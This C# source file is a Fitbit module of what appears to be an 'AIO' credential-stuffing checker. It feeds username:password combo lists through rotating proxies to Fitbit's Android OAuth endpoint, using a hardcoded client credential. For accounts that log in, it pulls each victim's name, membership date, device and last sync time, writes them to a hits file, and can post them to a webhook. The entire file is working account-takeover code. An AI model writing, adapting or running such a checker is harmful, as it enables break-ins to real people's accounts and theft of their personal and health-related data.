using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Fitbitmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = string.Concat("username=", array[0], "&password=", array[1],
                                "&scope=activity heartrate location nutrition profile settings sleep social weight mfa_ok&grant_type=password");
                            req.AddHeader("Authorization",
                                "Basic MjI4VlNSOjQ1MDY4YTc2Mzc0MDRmYzc5OGEyMDhkNmMxZjI5ZTRm");
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req
                                .Post(
                                    "https://android-api.fitbit.com/oauth2/token?session-data={\"os-name\":\"Android\",\"os-version\":\"5.1.1\",\"device-model\":\"LGM-V300K\",\"device-manufacturer\":\"LGE\",\"device-name\":\"\"}",
                                    str, "application/x-www-form-urlencoded").ToString();

                            if (text2.Contains("deviceVersion"))
                            {
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Fitbit_hits", array[0] + ":" + array[1]);
                            }
                            else
                            {
                                if (text2.Contains("Invalid username/password") ||
                                    text2.Contains("Missing parameters") || text2.Contains("plan\":\"\""))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (text2.Contains("access_token"))
                                {
                                    req.ClearAllHeaders();
                                    var str2 = Parse(text2, "access_token\":\"", "\"");
                                    var str3 = Parse(text2, "user_id\":\"", "\"");
                                    req.AddHeader("Authorization", "Bearer " + str2);
                                    var text3 = req
                                        .Get("https://android-api.fitbit.com/1/user/" + str3 + "/devices.json?")
                                        .ToString();
                                    if (text3.Contains("[]"))
                                    {
                                        Program.Fails++;
                                        Program.TotalChecks++;
                                    }
                                    else if (text3.Contains("deviceVersion"))
                                    {
                                        var text4 = Parse(text3, "deviceVersion\":\"", "\"");
                                        var text5 = Parse(text3, "lastSyncTime\":\"", "\"");
                                        req.AddHeader("Authorization", "Bearer " + str2);
                                        var text6 = req
                                            .Get("https://android-api.fitbit.com/1/user/" + str3 + "/profile.json")
                                            .ToString();
                                        if (text6.Contains("fullName\":\""))
                                        {
                                            var text7 = Parse(text6, "fullName\":\"", "\"");
                                            var text8 = Parse(text6, "memberSince\":\"", "\"");
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Fitbit_hits",
                                                array[0] + ":" + array[1] + " | Name: " + text7 + " | Member Since: " +
                                                text8 + " | Last Sync Time: " + text5 + " | Device: " + text4);
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Fitbit",
                                                    array[0] + ":" + array[1] + " | Name: " + text7 +
                                                    " | Member Since: " + text8 + " | Last Sync Time: " + text5 +
                                                    " | Device: " + text4);
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(
                                                    array[0] + ":" + array[1] + " | Name: " + text7 +
                                                    " | Member Since: " + text8 + " | Last Sync Time: " + text5 +
                                                    " | Device: " + text4, "Fitbit Hits");
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}